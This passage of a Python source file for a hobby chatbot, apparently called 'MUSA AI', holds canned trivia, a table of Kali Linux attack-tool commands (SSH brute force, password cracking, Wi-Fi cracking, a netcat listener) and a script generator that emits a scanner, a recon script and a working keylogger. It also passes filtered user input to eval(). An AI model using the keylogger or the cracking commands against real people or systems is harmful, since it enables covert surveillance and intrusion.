  Camus     → Life is absurd; create your own meaning
  Sartre    → "Existence precedes essence" - you define yourself
  Nietzsche → Will to Power; become who you are

Scientific View:
  → Biologically: Survive and reproduce
  → No predetermined meaning
  → Humans create meaning

Common Human Meanings:
  ✦ Love & relationships
  ✦ Achievement & legacy
  ✦ Helping others
  ✦ Spiritual connection
  ✦ Creative expression
  ✦ Knowledge & learning

My Take:
  Meaning is personal. Choose what gives YOUR life
  purpose, pursue it with passion, and help others
  along the way.
""",

    # ==================== COUNTRIES ====================
    "uk": """
🇬🇧 UNITED KINGDOM

Full Name: United Kingdom of Great Britain and Northern Ireland
Capital: London
Population: ~67 Million
Currency: British Pound Sterling (GBP)
Language: English

Countries Within UK:
  • England      → Capital: London
  • Scotland     → Capital: Edinburgh
  • Wales        → Capital: Cardiff
  • N. Ireland   → Capital: Belfast

Key Facts:
  • Constitutional Monarchy
  • King: Charles III (since 2022)
  • PM: Rishi Sunak (2022-2024), Keir Starmer (2024-)
  • Industrial Revolution started here
  • Once had largest empire (British Empire)
  • Permanent UN Security Council member
  • Left EU in 2020 (Brexit)
""",

    "turkey": """
🇹🇷 TURKEY (TÜRKIYE)

Capital: Ankara
Largest City: Istanbul
Population: ~85 Million
Currency: Turkish Lira (TRY)
Language: Turkish
President: Recep Tayyip Erdoğan

Geography:
  • Transcontinental (Asia & Europe)
  • Bosphorus Strait divides it
  • Borders: Greece, Bulgaria, Georgia,
    Armenia, Iran, Iraq, Syria

History:
  • Ottoman Empire capital
  • Republic founded 1923 by Mustafa Kemal Atatürk
  • Member of NATO
  • EU candidate (not yet member)

Famous:
  • Istanbul (Hagia Sophia, Blue Mosque)
  • Cappadocia
  • Troy (ancient city)
  • Turkish cuisine: Kebab, Baklava, Turkish tea
""",

    "iran": """
🇮🇷 IRAN (PERSIA)

Capital: Tehran
Population: ~87 Million
Currency: Iranian Rial (IRR)
Language: Farsi (Persian)
Government: Islamic Republic
Supreme Leader: Ayatollah Khamenei

History:
  • One of world's oldest civilizations
  • Persian Empire (550 BC) - Cyrus the Great
  • Sassanid Empire (224-651 AD)
  • Arab conquest → Islam adopted (651 AD)
  • 1979 Islamic Revolution

Key Facts:
  • Major oil & gas reserves
  • Nuclear program controversy
  • Under US sanctions
  • Shia Muslim majority
  • Famous for carpets, poetry, architecture

Poets:
  • Rumi (Jalal ud-Din Rumi) - Greatest Persian poet
  • Hafez
  • Omar Khayyam
""",

    "afghanistan": """
🇦🇫 AFGHANISTAN

Capital: Kabul
Population: ~42 Million
Language: Pashto, Dari
Currency: Afghani (AFN)
Government: Taliban (since 2021)

Geography:
  • Landlocked in Central/South Asia
  • Borders: Pakistan, Iran, Turkmenistan,
    Uzbekistan, Tajikistan, China
  • Hindu Kush mountains

History:
  • Ancient Silk Road crossroads
  • Conquered by: Alexander, Mongols,
    Timur, Mughals, British
  • Soviet Invasion (1979-1989)
  • Taliban Rule (1996-2001)
  • US invasion after 9/11 (2001)
  • US withdrawal & Taliban return (2021)

Current Situation:
  • Taliban controls government
  • International aid limited
  • Women's rights severely restricted
  • Economic crisis
""",

    # ==================== FOOD ====================
    "biryani": """
🍛 BIRYANI - THE KING OF FOODS

Origin: Persia → Mughal India → South Asia
Word means: "Fried before cooking" (Persian: Beriyan)

Types:
  • Hyderabadi Biryani  → Dum style, most famous
  • Karachi Biryani     → Spicy, tomatoes heavy
  • Lahori Biryani      → Rich, less rice ratio
  • Sindhi Biryani      → Potatoes, tart taste
  • Lucknowi Biryani    → Light, aromatic
  • Bombay Biryani      → Potato & plum added

Basic Ingredients:
  • Basmati rice (aged, long grain)
  • Meat (chicken/mutton/beef)
  • Onions (fried golden brown)
  • Yogurt
  • Whole spices (cardamom, cloves, cinnamon)
  • Saffron
  • Mint & coriander
  • Desi ghee

Secret to Perfect Biryani:
  → Use aged basmati rice
  → Marinate meat minimum 2 hours
  → Golden fried onions (birista) - key!
  → Dum cooking (sealed slow cooking)
  → Layer rice and meat properly
""",
}

# ====================== KALI COMMANDS DATABASE ======================
KALI_COMMANDS = {
    "nmap":        {"desc": "Network port scanner", "example": "nmap -sV -sC target", "category": "Recon"},
    "gobuster":    {"desc": "Directory/subdomain bruter", "example": "gobuster dir -u http://target -w wordlist.txt", "category": "Recon"},
    "amass":       {"desc": "Subdomain enumeration", "example": "amass enum -d target.com", "category": "Recon"},
    "theharvester":{"desc": "Email/domain OSINT", "example": "theHarvester -d target.com -b all", "category": "Recon"},
    "whois":       {"desc": "Domain registration info", "example": "whois target.com", "category": "Recon"},
    "nikto":       {"desc": "Web server scanner", "example": "nikto -h http://target.com", "category": "Web"},
    "sqlmap":      {"desc": "SQL injection tool", "example": "sqlmap -u 'http://site.com/?id=1' --dbs", "category": "Web"},
    "burpsuite":   {"desc": "Web app proxy/tester", "example": "burpsuite (GUI)", "category": "Web"},
    "wfuzz":       {"desc": "Web fuzzer", "example": "wfuzz -c -w wordlist.txt http://target/FUZZ", "category": "Web"},
    "metasploit":  {"desc": "Exploitation framework", "example": "msfconsole", "category": "Exploit"},
    "searchsploit":{"desc": "Exploit database search", "example": "searchsploit vsftpd 2.3.4", "category": "Exploit"},
    "hydra":       {"desc": "Network brute forcer", "example": "hydra -l admin -P pass.txt target ssh", "category": "Passwords"},
    "john":        {"desc": "Password cracker", "example": "john --wordlist=rockyou.txt hash.txt", "category": "Passwords"},
    "hashcat":     {"desc": "GPU password cracker", "example": "hashcat -m 0 hash.txt rockyou.txt", "category": "Passwords"},
    "aircrack-ng": {"desc": "WiFi password cracker", "example": "aircrack-ng -w wordlist cap-file.cap", "category": "Wireless"},
    "wifite":      {"desc": "Auto WiFi attack tool", "example": "wifite", "category": "Wireless"},
    "wireshark":   {"desc": "Network packet analyzer", "example": "wireshark (GUI)", "category": "Network"},
    "tcpdump":     {"desc": "CLI packet capture", "example": "tcpdump -i eth0 -w capture.pcap", "category": "Network"},
    "netcat":      {"desc": "Swiss army knife net tool", "example": "nc -lvnp 4444", "category": "Network"},
    "linpeas":     {"desc": "Linux priv esc checker", "example": "./linpeas.sh", "category": "Post-Exploit"},
    "bloodhound":  {"desc": "AD attack path finder", "example": "bloodhound (GUI)", "category": "Post-Exploit"},
}

# ====================== ADVANCED SCRIPT GENERATOR ======================
def generate_advanced_script(task):
    task_lower = task.lower()

    if "port scan" in task_lower or "scanner" in task_lower:
        return '''#!/usr/bin/env python3
"""
Professional Advanced Port Scanner
Generated by MUSA AI v4.0
"""
import socket
import sys
import threading
from datetime import datetime

open_ports = []
lock = threading.Lock()

def scan_port(target, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            result = s.connect_ex((target, port))
            if result == 0:
                try:
                    service = socket.getservbyport(port)
                except:
                    service = "unknown"
                with lock:
                    open_ports.append(port)
                    print(f"  [OPEN] Port {port:5d} → {service}")
    except Exception:
        pass

def main():
    if len(sys.argv) < 2:
        target = input("Enter Target IP/Domain: ").strip()
    else:
        target = sys.argv[1]

    try:
        ip = socket.gethostbyname(target)
    except socket.gaierror:
        print("[-] Cannot resolve hostname!")
        sys.exit(1)

    start_port = int(input("Start Port [default 1]: ") or 1)
    end_port = int(input("End Port [default 1024]: ") or 1024)

    print(f"""
╔══════════════════════════════════════╗
║     MUSA AI - PORT SCANNER v2.0     ║
╚══════════════════════════════════════╝
  Target  : {target} ({ip})
  Range   : {start_port} - {end_port}
  Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
""")

    threads = []
    for port in range(start_port, end_port + 1):
        t = threading.Thread(target=scan_port, args=(ip, port))
        threads.append(t)
        t.start()
        if len(threads) >= 100:
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.join()

    print(f"""
  Scan Complete!
  Open Ports: {len(open_ports)}
  Ports: {sorted(open_ports)}
""")

if __name__ == "__main__":
    main()
'''

    elif "recon" in task_lower:
        return '''#!/usr/bin/env python3
"""
Professional Recon Automation Script
Generated by MUSA AI v4.0
"""
import subprocess
import sys
import os
from datetime import datetime

def banner():
    print("""
╔══════════════════════════════════════╗
║   MUSA AI - AUTO RECON TOOL v2.0   ║
╚══════════════════════════════════════╝""")

def run(cmd, output_file=None):
    print(f"\\n[*] Running: {' '.join(cmd)}")
    print("-" * 40)
    try:
        if output_file:
            with open(output_file, 'w') as f:
                subprocess.run(cmd, stdout=f, stderr=subprocess.DEVNULL)
            print(f"[+] Saved to: {output_file}")
        else:
            subprocess.run(cmd)
    except FileNotFoundError:
        print(f"[-] Tool not found: {cmd[0]}")
    except KeyboardInterrupt:
        print("\\n[!] Skipping...")

def main():
    banner()
    if len(sys.argv) < 2:
        target = input("\\nEnter Target (IP or domain): ").strip()
    else:
        target = sys.argv[1]

    folder = f"recon_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(folder, exist_ok=True)
    print(f"\\n[+] Output folder: {folder}/")

    # 1. Nmap scan
    run(["nmap", "-sV", "-sC", "-p-", "--open", "-T4", target],
        f"{folder}/nmap_full.txt")

    # 2. Directory brute force
    run(["gobuster", "dir", "-u", f"http://{target}",
         "-w", "/usr/share/wordlists/dirb/common.txt",
         "-t", "50", "-o", f"{folder}/dirs.txt"])

    # 3. Subdomain enum
    run(["gobuster", "dns", "-d", target,
         "-w", "/usr/share/wordlists/dns/subdomains-top1million-5000.txt",
         "-o", f"{folder}/subdomains.txt"])

    # 4. HTTP headers
    run(["curl", "-I", f"http://{target}"],
        f"{folder}/headers.txt")

    # 5. WHOIS
    run(["whois", target], f"{folder}/whois.txt")

    print(f"""
╔══════════════════════════════════════╗
║         RECON COMPLETED!            ║
║  Results saved in: {folder}/
╚══════════════════════════════════════╝""")

if __name__ == "__main__":
    main()
'''

    elif "web scraper" in task_lower or "scrape" in task_lower:
        return '''#!/usr/bin/env python3
"""
Professional Web Scraper
Generated by MUSA AI v4.0
Requirements: pip install requests beautifulsoup4
"""
import requests
from bs4 import BeautifulSoup
import json
import sys

def scrape_website(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36'
    }

    print(f"[*] Scraping: {url}")

    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"[-] Error: {e}")
        return

    soup = BeautifulSoup(response.content, 'html.parser')

    data = {
        'url': url,
        'title': soup.title.string if soup.title else 'No title',
        'links': [],
        'headings': [],
        'paragraphs': [],
        'images': [],
        'forms': []
    }

    # Extract links
    for a in soup.find_all('a', href=True):
        href = a['href']
        text = a.get_text(strip=True)
        data['links'].append({'text': text, 'href': href})

    # Extract headings
    for tag in ['h1', 'h2', 'h3', 'h4']:
        for h in soup.find_all(tag):
            data['headings'].append({'tag': tag, 'text': h.get_text(strip=True)})

    # Extract paragraphs
    for p in soup.find_all('p')[:10]:
        text = p.get_text(strip=True)
        if text:
            data['paragraphs'].append(text)

    # Extract images
    for img in soup.find_all('img'):
        data['images'].append({
            'src': img.get('src', ''),
            'alt': img.get('alt', '')
        })

    # Extract forms
    for form in soup.find_all('form'):
        inputs = [inp.get('name', '') for inp in form.find_all('input')]
        data['forms'].append({
            'action': form.get('action', ''),
            'method': form.get('method', 'GET'),
            'inputs': inputs
        })

    # Display results
    print(f"""
╔══════════════════════════════════════╗
║    SCRAPING RESULTS - MUSA AI       ║
╚══════════════════════════════════════╝

  Title     : {data['title']}
  Links     : {len(data['links'])}
  Headings  : {len(data['headings'])}
  Images    : {len(data['images'])}
  Forms     : {len(data['forms'])}

HEADINGS:""")

    for h in data['headings'][:5]:
        print(f"  [{h['tag'].upper()}] {h['text']}")

    print("\\nTOP LINKS:")
    for link in data['links'][:10]:
        print(f"  → {link['text'][:30]:30} | {link['href'][:50]}")

    if data['forms']:
        print("\\nFORMS FOUND:")
        for form in data['forms']:
            print(f"  Action: {form['action']}, Method: {form['method']}")
            print(f"  Inputs: {form['inputs']}")

    # Save JSON
    with open('scraped_data.json', 'w') as f:
        json.dump(data, f, indent=2)
    print("\\n[+] Full data saved to: scraped_data.json")

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else input("Enter URL: ").strip()
    if not url.startswith('http'):
        url = 'https://' + url
    scrape_website(url)
'''

    elif "keylogger" in task_lower:
        return '''#!/usr/bin/env python3
"""
Educational Keylogger - MUSA AI
FOR EDUCATIONAL PURPOSES ONLY
Requirements: pip install pynput
"""
from pynput import keyboard
import datetime
import os

LOG_FILE = "keylog.txt"

def on_press(key):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    try:
        char = key.char
        log_entry = char
    except AttributeError:
        if key == keyboard.Key.space:
            log_entry = " "
        elif key == keyboard.Key.enter:
            log_entry = "\\n"
        elif key == keyboard.Key.backspace:
            log_entry = "[BACK]"
        elif key == keyboard.Key.tab:
            log_entry = "[TAB]"
        else:
            log_entry = f"[{key.name.upper()}]"

    with open(LOG_FILE, 'a') as f:
        f.write(log_entry)

    print(f"[{timestamp}] Key: {log_entry}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\\n[*] Keylogger stopped.")
        return False

print("""
Educational Keylogger - MUSA AI
Press ESC to stop
""")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
'''

    elif "network" in task_lower and "monitor" in task_lower:
        return '''#!/usr/bin/env python3
"""
Network Monitor Tool - MUSA AI
Requirements: pip install scapy psutil
"""
import psutil
import time
import os
from datetime import datetime

def get_network_stats():
    stats = psutil.net_io_counters()
    return {
        'bytes_sent': stats.bytes_sent,
        'bytes_recv': stats.bytes_recv,
        'packets_sent': stats.packets_sent,
        'packets_recv': stats.packets_recv
    }

def format_bytes(bytes_val):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if bytes_val < 1024:
            return f"{bytes_val:.1f} {unit}"
        bytes_val /= 1024
    return f"{bytes_val:.1f} TB"

def show_connections():
    print("\\nACTIVE CONNECTIONS:")
    print("-" * 60)
    conns = psutil.net_connections()
    for conn in conns[:15]:
        if conn.status == 'ESTABLISHED':
            laddr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else ""
            raddr = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else ""
            print(f"  {laddr:25} → {raddr:25} [{conn.status}]")

def main():
    print("""
╔══════════════════════════════════════╗
║   MUSA AI - NETWORK MONITOR v1.0   ║
║   Press Ctrl+C to stop             ║
╚══════════════════════════════════════╝""")

    prev = get_network_stats()
    time.sleep(1)

    try:
        while True:
            os.system('clear' if os.name != 'nt' else 'cls')
            curr = get_network_stats()

            upload_speed = curr['bytes_sent'] - prev['bytes_sent']
            download_speed = curr['bytes_recv'] - prev['bytes_recv']

            print(f"""
  Time      : {datetime.now().strftime('%H:%M:%S')}
  Upload    : {format_bytes(upload_speed)}/s
  Download  : {format_bytes(download_speed)}/s
  Total Sent: {format_bytes(curr['bytes_sent'])}
  Total Recv: {format_bytes(curr['bytes_recv'])}""")

            show_connections()
            prev = curr
            time.sleep(2)

    except KeyboardInterrupt:
        print("\\n[*] Monitor stopped.")

if __name__ == "__main__":
    main()
'''

    else:
        return f'''#!/usr/bin/env python3
"""
Custom Script: {task}
Generated by MUSA AI v4.0
{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
import sys
import os
import subprocess
from datetime import datetime

def banner():
    print("""
╔══════════════════════════════════════╗
║      MUSA AI - CUSTOM SCRIPT       ║
╚══════════════════════════════════════╝""")
    print(f"  Task: {task}")
    print(f"  Time: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}")
    print()

def main():
    banner()
    print("[*] Starting task: {task}")
    print("[*] Script is ready - add your logic below")

    # === YOUR CODE HERE ===
    # Add your implementation below
    # Example:
    # target = input("Enter target: ")
    # print(f"Processing: {{target}}")
    # === END ===

    print("[+] Done!")

if __name__ == "__main__":
    main()
'''

# ====================== SMART RESPONSE ENGINE ======================
def get_intelligent_response(question):
    q = question.lower().strip()

    # Check knowledge base - exact and partial matches
    for key, value in KNOWLEDGE_BASE.items():
        if key in q or q in key:
            return value

    # Advanced pattern matching
    patterns = {
        # Greetings
        ("hi", "hello", "hey", "salam", "assalam", "helo"):
            "Hello Boss! I'm MUSA AI v4.0. I'm ready to help you with ANYTHING — ask me about science, history, tech, hacking, countries, programming, or anything else!",

        ("how are you", "how r you", "kya hal", "kaisa ho"):
            "I'm running perfectly at 100% efficiency! Ready to answer any question you have. What can I help you with today?",

        ("thank", "thanks", "shukriya", "jazakallah", "barakallah"):
            "You're welcome Boss! It's always my pleasure. Ask me anything else anytime!",

        ("good morning", "subah", "morning"):
            f"Good Morning Boss! Today is {datetime.now().strftime('%A, %B %d, %Y')}. I hope you have a productive day! How can I help you?",

        ("good night", "shab", "night", "raat"):
            "Good Night Boss! Rest well. I'll be here whenever you need me!",
    }

    for keys, response in patterns.items():
        if any(k in q for k in keys):
            return response

    # Topic detection with smart responses
    smart_responses = {}

    # Science topics
    if any(w in q for w in ["atom", "molecule", "chemistry", "element", "periodic"]):
        smart_responses["content"] = """⚗️ CHEMISTRY / ATOMIC SCIENCE

Atoms are the building blocks of all matter.

Key Facts:
  • Atom parts: Protons (+), Neutrons (0), Electrons (-)
  • Periodic Table: 118 known elements
  • Smallest element: Hydrogen (H)
  • Most abundant element in universe: Hydrogen
  • Most abundant in Earth's crust: Oxygen

Famous Scientists:
  • Dmitri Mendeleev → Created Periodic Table (1869)
  • Ernest Rutherford → Discovered atomic nucleus
  • Niels Bohr → Atomic model

States of Matter:
  Solid → Liquid → Gas → Plasma
  (as temperature/energy increases)

Chemical Bonding:
  • Ionic Bond     → Transfer of electrons (NaCl)
  • Covalent Bond  → Sharing of electrons (H₂O)
  • Metallic Bond  → Found in metals"""

    elif any(w in q for w in ["space", "universe", "galaxy", "star", "nasa", "cosmos"]):
        smart_responses["content"] = """🌌 SPACE & UNIVERSE

Universe Facts:
  • Age: 13.8 Billion years
  • Size: 93 Billion light years (observable)
  • Galaxies: ~2 Trillion
  • Stars: ~10²⁴ (more than grains of sand on Earth)

Our Galaxy:
  • Name: Milky Way
  • Type: Spiral galaxy
  • Stars: 100-400 Billion
  • Size: 100,000 light years across
  • Black hole at center: Sagittarius A*

Types of Stars:
  • Red Dwarf      → Smallest, most common
  • Yellow Dwarf   → Our Sun
  • Blue Giant     → Hottest, brightest
  • Neutron Star   → Collapsed star, super dense
  • Black Hole     → Gravity so strong light can't escape

Space Exploration:
  • Hubble Space Telescope → Stunning deep space images
  • James Webb (2022)      → Farthest images ever
  • ISS                    → 400km above Earth
  • Voyager 1              → Farthest human-made object"""

    elif any(w in q for w in ["dinosaur", "jurassic", "prehistoric", "fossil", "extinct"]):
        smart_responses["content"] = """🦕 DINOSAURS

Dinosaurs ruled Earth for ~165 Million years (Mesozoic Era)

Era Breakdown:
  • Triassic (252-201 Ma)   → First dinosaurs
  • Jurassic (201-145 Ma)   → Giants dominate
  • Cretaceous (145-66 Ma)  → Peak diversity

Famous Dinosaurs:
  • T-Rex           → King of dinosaurs, tiny arms, massive jaws
  • Velociraptor    → Smart, pack hunter (turkey-sized actually!)
  • Triceratops     → 3 horns, plant-eater
  • Brachiosaurus   → Giraffe-like neck, 30m tall
  • Stegosaurus     → Plates on back
  • Pterodactyl     → Flying reptile (not technically a dino)

Extinction:
  66 Million years ago: Asteroid hit Mexico (Chicxulub)
  → Dust blocked sunlight
  → Plants died
  → Food chain collapsed
  → 75% of all species went extinct

Survivors:
  Birds are modern descendants of theropod dinosaurs!
  Crocodiles, sharks also survived."""

    elif any(w in q for w in ["climate", "global warming", "environment", "carbon", "pollution"]):
        smart_responses["content"] = """🌍 CLIMATE CHANGE & ENVIRONMENT

The Problem:
  Earth's temperature rising due to greenhouse gases
  mainly from human activities (burning fossil fuels).

Key Facts:
  • Earth has warmed ~1.1°C since pre-industrial times
  • CO2 levels highest in 3 million years (420+ ppm)
  • Arctic ice melting 40% faster than predicted
  • Sea levels rising ~3.3mm/year
  • 1 million species at risk of extinction

Greenhouse Gases:
  • CO₂ → Burning coal, oil, gas
  • Methane → Livestock, landfills, gas leaks
  • N₂O → Agriculture, fertilizers

Effects:
  → More extreme weather (floods, droughts, hurricanes)
  → Rising sea levels (threatens coastal cities)
  → Species extinction
  → Food & water shortages
  → Health impacts

Solutions:
  → Renewable energy (solar, wind, hydro)
  → Electric vehicles
  → Reforestation
  → Carbon capture technology
  → Nuclear energy
  → Individual: reduce, reuse, recycle"""

    elif any(w in q for w in ["water", "ocean", "river", "sea"]):
        smart_responses["content"] = """💧 WATER - THE ESSENCE OF LIFE

Water Facts:
  • Chemical formula: H₂O
  • Covers 71% of Earth's surface
  • Only 3% is fresh water
  • Of that 3%, 69% is frozen in ice caps

Earth's Water:
  • Oceans    → 96.5% of all water
  • Ice caps  → 1.74%
  • Groundwater → 1.69%
  • Surface water (rivers, lakes) → tiny fraction

Water Cycle:
  Evaporation → Condensation → Precipitation → Collection
  (Sun heats) → (Forms clouds) → (Rain/Snow) → (Oceans/Rivers)

Human Need:
  • Body is 60% water
  • Can survive 3 weeks without food
  • Can only survive 3 DAYS without water
  • Need: 2-3 liters daily

Water Crisis:
  • 2.2 Billion people lack safe drinking water
  • By 2050, half world could face water scarcity
  • Pakistan has severe water stress"""

    if "content" in smart_responses:
        return smart_responses["content"]

    # Country/region detection
    country_hints = {
        "russia": "🇷🇺 Russia is the world's largest country (17.1M km²), spanning 11 time zones. Capital: Moscow. Population: ~145M. President: Vladimir Putin. Known for Siberia, Kremlin, Cold War with USA. Major nuclear & military power.",
        "japan": "🇯🇵 Japan is an island nation in East Asia. Capital: Tokyo. Population: ~125M. Known for: Technology (Sony, Toyota, Honda), Anime, Sushi, Mount Fuji, Samurai history. World's 3rd largest economy.",
        "brazil": "🇧🇷 Brazil is South America's largest country. Capital: Brasília. Largest city: São Paulo. Population: ~215M. Amazon Rainforest (60% in Brazil). Famous for Football (5x World Cup), Carnival, beaches.",
        "france": "🇫🇷 France is Western Europe's largest country. Capital: Paris. Population: ~68M. Known for: Eiffel Tower, fashion, cuisine, art, history. 6th largest economy. Permanent UN Security Council member.",
        "germany": "🇩🇪 Germany is Europe's largest economy. Capital: Berlin. Population: ~84M. Known for: Engineering (BMW, Mercedes, Volkswagen), World Wars history, October fest, Autobahn (no speed limit highway).",
        "australia": "🇦🇺 Australia is both a continent and country. Capital: Canberra. Largest city: Sydney. Population: ~26M. Known for: Kangaroos, Koalas, Great Barrier Reef, unique wildlife. 12th largest economy.",
        "canada": "🇨🇦 Canada is world's 2nd largest country (10M km²). Capital: Ottawa. Population: ~40M. Known for: Natural beauty, multicultural society, maple syrup, hockey. 8th largest economy.",
    }

    for country, response in country_hints.items():
        if country in q:
            return response

    # Math/calculation
    if any(w in q for w in ["calculate", "what is", "solve", "math"]) and any(c in q for c in "0123456789+-*/"):
        try:
            expr = ''.join(c for c in q if c in '0123456789+-*/.() ')
            expr = expr.strip()
            if expr:
                result = eval(expr)
                return f"🔢 Math Result:\n  {expr} = {result}"
        except:
            pass

    # Time/date
    if any(w in q for w in ["time", "date", "today", "year", "day"]):
        now = datetime.now()
        return f"""🕐 CURRENT DATE & TIME

  Date    : {now.strftime('%A, %B %d, %Y')}
  Time    : {now.strftime('%I:%M:%S %p')}
  Day     : {now.strftime('%A')}
  Month   : {now.strftime('%B')}
  Year    : {now.year}
  Week    : Week {now.isocalendar()[1]} of {now.year}"""

    # Coding help
    if any(w in q for w in ["code", "program", "function", "loop", "class", "error", "debug"]):
        return """💻 CODING HELP

I can help you with code! Please be more specific:

Tell me:
  → Which programming language? (Python, C++, JS, etc.)
  → What are you trying to do?
  → Share your code (if you have an error)

I specialize in:
  ✓ Python (Expert level)
  ✓ Bash/Shell scripting
  ✓ JavaScript basics
  ✓ SQL queries
  ✓ HTML/CSS basics

Example questions I can answer:
  → "Write a Python function to sort a list"
  → "How to handle exceptions in Python?"
  → "Write a bash script to backup files"
  → "Generate Python script for port scanner"
"""

    # Default intelligent response
    return f"""🤖 MUSA AI Response:

I understood your question: "{question}"

I have extensive knowledge in:
  📚 General Knowledge & World Facts
  🌍 Countries, History, Geography
  🔬 Science, Technology, Space
  🐍 Python Programming
  🐉 Kali Linux & Cybersecurity
  💰 Finance & Business
  🏥 Health & Medicine
  ⚽ Sports & Entertainment

To get the best answer, try being specific:
  ✓ "Tell me about World War 2"
  ✓ "Explain how Python works"  
  ✓ "What is machine learning"
  ✓ "Info about Pakistan"
  ✓ "How does blockchain work"
  ✓ "nmap help"
  ✓ "generate python script for port scanner"

Type 'help' to see all available commands.
"""

# ====================== MAIN PROCESSING ======================
def process_input(user_input):
    text = user_input.strip()
    text_lower = text.lower()

    if not text:
        return True

    # Remember input
    SESSION_MEMORY.append(text)

    # Exit commands
    if text_lower in ["exit", "quit", "bye", "goodbye", "khuda hafiz", "acha bye"]:
        speak("Thank you for using MUSA AI v4.0 Boss!")
        speak("Stay curious, keep learning, and remember — knowledge is power!")
        speak("Goodbye! Take care! 🌟")
        return False

    # Help
    if text_lower in ["help", "commands", "menu"]:
        print_section("MUSA AI v4.0 - ALL COMMANDS")
        print(f"""{Colors.WHITE}
  ┌─────────────────────────────────────────────────────┐
  │                  GENERAL QUESTIONS                  │
  ├─────────────────────────────────────────────────────┤
  │  Ask me ANYTHING in natural language:               │
  │  • "What is machine learning?"                      │
  │  • "Tell me about Pakistan"                         │
  │  • "Explain World War 2"                            │
  │  • "How does the internet work?"                    │
  │  • "What is Bitcoin?"                               │
  │  • "Tell me about Solar System"                     │
  │  • "History of Islam"                               │
  │  • "Info about Mughal Empire"                       │
  ├─────────────────────────────────────────────────────┤
  │                  KALI LINUX TOOLS                   │
  ├─────────────────────────────────────────────────────┤
  │  show kali          → All Kali tools                │
  │  nmap help          → Nmap complete guide           │
  │  metasploit help    → Metasploit guide              │
  │  sqlmap help        → SQLmap guide                  │
  │  hydra help         → Hydra guide                   │
  │  burp suite help    → Burp Suite guide              │
  │  kali linux         → Kali overview                 │
  ├─────────────────────────────────────────────────────┤
  │               SCRIPT GENERATION                     │
  ├─────────────────────────────────────────────────────┤
  │  generate script for port scanner                   │
  │  generate script for recon                          │
  │  generate script for web scraper                    │
  │  generate script for network monitor                │
  │  generate script for keylogger                      │
  ├─────────────────────────────────────────────────────┤
  │                   UTILITIES                         │
  ├─────────────────────────────────────────────────────┤
  │  show kali          → Kali tools list               │
  │  memory             → Recent questions              │
  │  clear              → Clear screen                  │
  │  time               → Current date/time             │
  │  help               → This menu                     │
  │  exit               → Quit                          │
  └─────────────────────────────────────────────────────┘
{Colors.ENDC}""")
        return True

    # Kali tools list
    if text_lower in ["show kali", "kali tools", "kali commands"]:
        print_section("KALI LINUX TOOLS - COMPLETE LIST")
        current_cat = ""
        for cmd, info in sorted(KALI_COMMANDS.items(), key=lambda x: x[1]['category']):
            cat = info.get("category", "Other")
            if cat != current_cat:
                current_cat = cat
                cprint(f"\n  🔹 {cat}", Colors.OKCYAN, bold=True)
            print(f"    {cmd:<15} → {info['desc']}")
            print(f"    {'':15}   Example: {Colors.GRAY}{info['example']}{Colors.ENDC}")
        return True

    # Tool-specific help
    if text_lower.endswith(" help"):
        tool = text_lower.replace(" help", "").strip()
        if tool in KNOWLEDGE_BASE:
            print_answer(f"{tool.upper()} - COMPLETE GUIDE", KNOWLEDGE_BASE[tool])
            return True

    # Generate scripts
    if any(p in text_lower for p in ["generate script", "create script", "write script",
                                      "generate python", "create python"]):
        # Extract task
        for pattern in ["generate script for", "create script for", "write script for",
                       "generate python script for", "create python script for"]:
            if pattern in text_lower:
                task = text_lower.replace(pattern, "").strip()
                break
        else:
            task = input(f"\n{Colors.OKCYAN}What should the script do? {Colors.ENDC}").strip()

        script = generate_advanced_script(task)
        cprint(f"\n✅ SCRIPT GENERATED BY MUSA AI v4.0", Colors.OKGREEN, bold=True)
        cprint("─" * 60, Colors.GRAY)
        print(f"{Colors.WHITE}{script}{Colors.ENDC}")
        cprint("─" * 60, Colors.GRAY)

        save = input(f"\n{Colors.OKCYAN}Save to file? (y/n): {Colors.ENDC}").strip().lower()
        if save == 'y':
            filename = f"musa_script_{int(time.time())}.py"
            with open(filename, 'w') as f:
                f.write(script)
            cprint(f"✅ Saved to: {filename}", Colors.OKGREEN)
        return True

    # Memory
    if text_lower in ["memory", "history"]:
        print_section("SESSION MEMORY")
        if SESSION_MEMORY:
            for i, item in enumerate(SESSION_MEMORY[-10:], 1):
                print(f"  {i:2}. {item}")
        else:
            print("  No history yet.")
        return True

    # Clear screen
    if text_lower in ["clear", "cls"]:
        os.system("clear" if os.name != "nt" else "cls")
        print_header()
        return True

    # Direct knowledge base lookup
    for key in KNOWLEDGE_BASE:
        if key in text_lower or text_lower in key:
            print_answer(key.upper(), KNOWLEDGE_BASE[key])
            return True

    # Kali commands check
    for cmd in KALI_COMMANDS:
        if cmd in text_lower and "help" in text_lower:
            if cmd in KNOWLEDGE_BASE:
                print_answer(f"{cmd.upper()} GUIDE", KNOWLEDGE_BASE[cmd])
                return True

    # Get intelligent response
    response = get_intelligent_response(user_input)

    # Check if it's long (use print instead of speak for long answers)
    if len(response) > 300:
        print_answer("MUSA AI ANSWER", response)
    else:
        speak(response)

    return True

# ====================== HEADER ======================
def print_header():
    os.system("clear" if os.name != "nt" else "cls")
    now = datetime.now()
    print(f"""
{Colors.OKCYAN}{'═' * 65}
{Colors.BOLD}{Colors.OKGREEN}
   ███╗   ███╗██╗   ██╗███████╗ █████╗      █████╗ ██╗
   ████╗ ████║██║   ██║██╔════╝██╔══██╗    ██╔══██╗██║
   ██╔████╔██║██║   ██║███████╗███████║    ███████║██║
   ██║╚██╔╝██║██║   ██║╚════██║██╔══██║    ██╔══██║██║
